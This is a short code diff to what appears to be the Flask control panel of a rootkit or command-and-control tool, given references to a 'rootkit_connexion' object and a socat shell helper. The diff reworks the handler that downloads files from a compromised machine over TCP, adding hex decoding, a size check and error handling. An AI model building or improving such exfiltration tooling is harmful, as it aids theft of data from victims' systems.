@@ -1,3 +1,4 @@
+import binascii
 from utils.socat import run_socat_shell
 from flask import jsonify, request
 import config as cfg
@@ -300,16 +301,23 @@ def download_remote():
 
         size = int(response.split()[1])
         data = cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")
+        
+        data_bytes = binascii.unhexlify(data.strip())
+        
+        if len(data_bytes) != size:
+            return jsonify({"error": f"Received {len(data_bytes)} bytes, expected {size}"}), 500
 
         if data is False or data is None:
             return jsonify({"error": "Failed to receive file (missing data or network error)"}), 500
 
         with open(local_path, "wb") as f:
-            f.write(data.encode("latin1") if isinstance(data, str) else data)
+            f.write(data_bytes)
 
         print(f"File downloaded successfully at {local_path}")
         return jsonify({"message": f"File downloaded successfully: {filename}", "download_url": os.path.join(cfg.DOWNLOAD_FOLDER, filename)}), 200
 
+    except (binascii.Error, TypeError) as ex:
+        return jsonify({"error": f"Bad hex data from server: {ex}"}), 500
     except Exception as e:
         return jsonify({"error": f"Error during download: {str(e)}"}), 500
 
